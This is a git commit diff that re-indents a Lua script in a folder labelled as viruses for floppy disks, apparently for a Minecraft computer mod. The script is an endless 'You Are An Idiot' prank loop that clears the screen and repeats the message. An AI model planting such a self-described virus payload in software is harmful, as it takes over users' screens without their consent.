6c06e9a5d312a75dc4266d0f08422bfc3eb966b9
Fakedrift <127430703+Fakedrift@users.noreply.github.com>
2023-07-14 21:17:43 +0100

    .

--- Virus's (go on floppy disks)/YAAI.lua
+++ Virus's (go on floppy disks)/YAAI.lua
@@ -8,16 +8,16 @@ local VS = [[
  local y = 1
  term.clear()
  while true do
-  for y = 1, 10 do
-   term.setCursorPos(1, y)
-   print("You Are An Idiot")
-   y = y + 1
-   term.setCursorPos(1, y)
-   os.sleep(0.9)
-   print("You Are An Idiot")
-   if y > 10 then
-     term.clear()
-   end
+   for y = 1, 10 do
+     term.setCursorPos(1, y)
+     print("You Are An Idiot")
+     y = y + 1
+     term.setCursorPos(1, y)
+     os.sleep(0.9)
+     print("You Are An Idiot")
+     if y > 10 then
+       term.clear()
+     end
   end
  end
 ]]
